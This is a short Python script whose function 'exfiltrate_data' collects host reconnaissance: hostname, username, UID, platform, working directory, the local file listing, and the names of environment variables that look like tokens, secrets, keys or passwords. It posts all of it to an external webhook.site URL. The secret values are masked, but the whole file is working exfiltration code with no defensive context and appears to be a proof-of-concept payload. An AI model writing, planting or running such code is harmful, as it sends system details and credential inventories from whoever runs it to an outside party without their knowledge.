import os
import requests
import socket
import platform
import sys

 
WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"

def exfiltrate_data():
    print("--- Starting Data Collection ---")
    
 
    user = os.getenv('USER') or os.getenv('USERNAME') or "unknown"
    uid = os.getuid() if hasattr(os, 'getuid') else "unknown"
    
 
    env_vars = {k: "********" for k, v in os.environ.items() if any(s in k.upper() for s in ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'AUTH', 'CREDENTIAL'])}
    
    data = {
        "hostname": socket.gethostname(),
        "user": user,
        "uid": uid,
        "platform": platform.platform(),
        "detected_secrets": list(env_vars.keys()),
        "working_directory": os.getcwd(),
        "file_list": os.listdir('.') if os.path.exists('.') else []
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        print(f"Data sent. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Failed to exfiltrate: {e}")

if __name__ == "__main__":
    exfiltrate_data()
